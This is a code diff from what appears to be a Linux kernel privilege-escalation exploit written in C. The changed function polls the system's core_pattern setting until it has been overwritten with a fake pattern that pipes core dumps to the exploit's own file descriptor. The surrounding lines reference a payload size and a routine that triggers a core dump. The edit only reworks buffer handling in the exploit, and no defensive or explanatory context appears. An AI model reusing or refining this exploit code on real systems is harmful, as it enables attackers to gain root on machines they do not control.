@@ -53,7 +53,6 @@
 #define PAYLOAD_SZ			95
 
 static const char fake_core_pattern[] = "|/proc/%P/fd/777 %P";
-#define CHECK_SZ 256
 
 /* ============================== Kernel stuff ============================== */
 
@@ -204,29 +203,44 @@ int act(int act_fd, int code, int n, char *args)
 
 int wait_new_core_pattern(int fd)
 {
-	char buf[CHECK_SZ] = { 0 };
+	int result = EXIT_FAILURE;
+	char *buf = NULL;
 	size_t len = strlen(fake_core_pattern); /* don't check the last symbol */
 	ssize_t bytes = -1;
 	int ret = -1;
 
+	buf = malloc(len + 1);
+	if (buf == NULL) {
+		perror("[-] malloc");
+		return EXIT_FAILURE;
+	}
+	memset(buf, 0, len + 1);
+
 	while (1) {
-		bytes = read(fd, buf, CHECK_SZ);
+		bytes = read(fd, buf, len);
 		if (bytes < 0) {
 			perror("[-] read core_pattern");
-			return EXIT_FAILURE;
+			result = EXIT_FAILURE;
+			break;
 		}
 
-		if (strncmp(fake_core_pattern, buf, len) == 0)
-			return EXIT_SUCCESS;
+		if (strncmp(fake_core_pattern, buf, len) == 0) {
+			result = EXIT_SUCCESS;
+			break;
+		}
 
 		ret = lseek(fd, 0, SEEK_SET);
 		if (ret < 0) {
 			perror("[-] lseek core_pattern");
-			return EXIT_FAILURE;
+			result = EXIT_FAILURE;
+			break;
 		}
 
 		sleep(1);
 	}
+
+	free(buf);
+	return result;
 }
 
 void wait_and_trigger_core_dump(void)
